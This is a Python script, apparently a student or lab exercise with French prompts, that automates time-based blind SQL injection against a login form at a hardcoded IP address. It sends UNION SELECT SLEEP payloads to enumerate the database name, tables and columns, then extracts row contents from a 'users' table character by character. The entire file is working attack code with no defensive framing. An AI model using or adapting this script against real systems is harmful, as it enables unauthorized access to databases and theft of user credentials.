import requests
import time

def db_name():
    dictionary = ["a","b","c","d","e","f","g","h","i","j","k","l","m","n","o","p","q","r","s","t","u","v","w","x","y","z","_"]
    a=0
    db = []
    texte = ""
    TIME = 5
    global url
    url = "http://51.15.136.118/login_sqlmap.php/"
    global table 
    table = ""

    for letter in dictionary:
        for num in range(1, 20):
            usr = "idc"
            nums = ",{}".format(",".join([str(i) for i in range(1, num + 1)]))
            passwd_type = "' UNION SELECT SLEEP(5)" + nums + "" + " where database() like '" + letter + "%' -- "
            print(passwd_type)
            start_time = time.time()
            response = requests.post(url, data={'username': passwd_type, 'password': usr})
            end_time = time.time()
            total_time = end_time - start_time
            if total_time >= TIME:
                table = nums
                break
        if total_time >= TIME:
            break
 
 
    print(table)

    for i in range(1, 20):
        for j in range(0, len(dictionary)):
            usr = "idc"
            passwd = "' UNION SELECT SLEEP(5)" + table + " where database() like '" + texte + dictionary[j] + "%' -- "
            print(passwd)

            start_time = time.time()
            response = requests.post(url, data={'username': usr, 'password': passwd})
            end_time = time.time()
            total_time = end_time - start_time
            """print(total_time)"""
            a += 1
            print(a)
            if a > 27:
                break
            if total_time >= TIME:
                texte += dictionary[j]
                print(texte)
                i += 1
                j = 0
                a = 0
                break
    print(texte)
    db.append(texte)
    print(db)

    b=0
    for x in db:
        b += 1
        """print("" + b + "" + db[x] + "|")"""
        """print(str(a) + x)"""
        print("Database {} : {} ".format(b, x))
    
    c = int(input("Choisissez le numéro correspondant au nom de la base de donnée sur laquelle vous voulez continué : "))

    print("Vous avez choisi {}. ".format(db[c-1]))
    final_db=""
    jsp = final_db + "".join(db[c-1])
    print(jsp)
    return jsp

def table_name(database):
    dictionary = ["a","b","c","d","e","f","g","h","i","j","k","l","m","n","o","p","q","r","s","t","u","v","w","x","y","z"]
    tables_name=[]
    a=0
    texte = ""
    TIME = 5
    for i in range(1, 50):
        for j in range(0, len(dictionary)):
            if a > 25:
                if texte != "":
                    """enlever """
                    rm_letter = texte[0]
                    dictionary.remove(rm_letter)
                    print(dictionary)
                    tables_name.append(texte)
                    texte = ""
                    a=0
                    break
                else:
                    break
            usr = "idc"
            passwd = "' UNION SELECT SLEEP(5)" + table + " TABLE_NAME FROM information_schema.tables WHERE table_schema='" + database + "' AND TABLE_NAME like '" + texte + dictionary[j] + "%' -- "
            print(passwd)
            start_time = time.time()
            response = requests.post(url, data={'username': usr, 'password': passwd})
            end_time = time.time()
            total_time = end_time - start_time
            a += 1
            print(texte)
            print(tables_name)
            print(a)
            
            if total_time >= TIME:
                texte += dictionary[j]
                print(texte)
                i += 1
                j = 0
                a = 0
                break
    print(tables_name)
    b=0
    for x in tables_name:
        b += 1
        print("Table {} : {} ".format(b, x))
    
    c = int(input("Choisissez le numéro correspondant au nom de la table sur laquelle vous voulez continué : "))

    print("Vous avez choisi {}. ".format(tables_name[c-1]))
    final_db=""
    jsp2 = final_db + "".join(tables_name[c-1])
    print(jsp2)
    return jsp2


def column_name(database, nom_table):
    dictionary = ["a","b","c","d","e","f","g","h","i","j","k","l","m","n","o","p","q","r","s","t","u","v","w","x","y","z"]
    global columns_name
    columns_name=[]
    a=0
    texte = ""
    TIME = 5
    for i in range(1, 50):
        for j in range(0, len(dictionary)):
            if a > 25:
                if texte != "":
                    rm_letter = texte[0]
                    dictionary.remove(rm_letter)
                    print(dictionary)
                    columns_name.append(texte)
                    texte = ""
                    a=0
                    break
                else:
                    break
            usr = "idc"
            passwd = "' UNION SELECT SLEEP(5)" + table + " COLUMN_NAME FROM information_schema.columns WHERE table_schema='" + database + "' AND TABLE_NAME='" + nom_table + "' AND COLUMN_NAME like '" + texte + dictionary[j] + "%' -- "
            print(passwd)
            start_time = time.time()
            response = requests.post(url, data={'username': usr, 'password': passwd})
            end_time = time.time()
            total_time = end_time - start_time
            a += 1
            print(texte)
            print(columns_name)
            print(a)
            
            if total_time >= TIME:
                texte += dictionary[j]
                print(texte)
                i += 1
                j = 0
                a = 0
                break
    print(columns_name)
    b=0
    for x in columns_name:
        b += 1
        print("Table {} : {} ".format(b, x))
    return columns_name
    """c = int(input("Choisissez le numéro correspondant au nom de la colonne sur laquelle vous voulez continué : "))
    print("Vous avez choisi {}. ".format(columns_name[c-1]))
    final_db=""
    jsp3 = final_db + "".join(columns_name[c-1])
    print(jsp3)
    return jsp3"""


def trouver_tab0(nom_table):
    tab = columns_name
    dictionary = ["1","2","3","4","5","6","7","8","9","a","b","c","d","e","f","g","h","i","j","k","l","m","n","o","p","q","r","s","t","u","v","w","x","y","z"]
    texte = ""
    TIME = 5
    table = ",1,2"
    a = 0
    idk = []
    for i in range(1, 10):
        for j in range(0, len(dictionary)):
            if a > 34:
                if texte != "":
                    print(texte)
                    rm_letter = texte[0]
                    dictionary.remove(rm_letter)
                    idk.append(texte)
                    a=0
                    texte = ""
                    break
            usr = "idc"
            start_time = time.time()
            passwd = "' UNION SELECT SLEEP(5)" + table + " "" " + tab[0] + " FROM " + nom_table + " WHERE " + tab[0] + " like '" + texte + dictionary[j] + "%' -- "
            response = requests.post(url, data={'username': usr, 'password': passwd})
            """print(passwd)"""
            end_time = time.time()
            total_time = end_time - start_time
            if total_time >= TIME:
                texte += dictionary[j]
                print(texte)
                a=0
            
            a +=1
    print(idk)
    return idk


def dump_columns(table, tab0, column_name):
    tab = column_name
    nom_colonne = tab0
    dictionary = ["1","2","3","4","5","6","7","8","9","a","b","c","d","e","f","g","h","i","j","k","l","m","n","o","p","q","r","s","t","u","v","w","x","y","z"]
    texte = ""
    TIME = 5
    table = ",1,2"
    a = 0
    z=0
    idk = []

    while z <= (len(tab)):
        z += 1
        for x in nom_colonne:
            x = int(x)
            for i in range (1,30):
                for j in range(0, len(dictionary)):
                    if a > 36:
                        if texte != "":
                            idk.append(texte)
                            a=0
                            texte = ""
                            print(idk)
                            if x < len(nom_colonne):
                                x += 1
                            elif z < len(tab)-1:
                                x = 1
                                z += 1
                            else:
                                c = len(idk)
                                d = c//2
                                a=idk[d:]
                                b=idk[:d]
                                print(tab)
                                for j in range(len(nom_colonne)):
                                    print(" {} : {} : {} ".format(nom_colonne[j], b[j], a[j]))
                                quit()
                            break
                        else:
                            break

                    usr = "idc"
                    start_time = time.time()
                    passwd = "' UNION SELECT SLEEP(5)" + table + " "" " + tab[0] + " FROM users WHERE " + tab[0] + " = " + str(x) + " and " + tab[z] + " like '" + texte + dictionary[j] + "%' -- "
                    response = requests.post(url, data={'username': usr, 'password': passwd})
                    print(passwd)
                    end_time = time.time()
                    total_time = end_time - start_time
                    a+=1
                    if total_time >= TIME:
                        texte += dictionary[j]
                        a=0
                        j=0
                        i+=1
                        break


nom_base_de_donnée = db_name()
nom_table = table_name(nom_base_de_donnée)
nom_colonne = column_name(nom_base_de_donnée, nom_table)
tab0 = trouver_tab0(nom_table)
param = dump_columns(nom_table, tab0, nom_colonne)
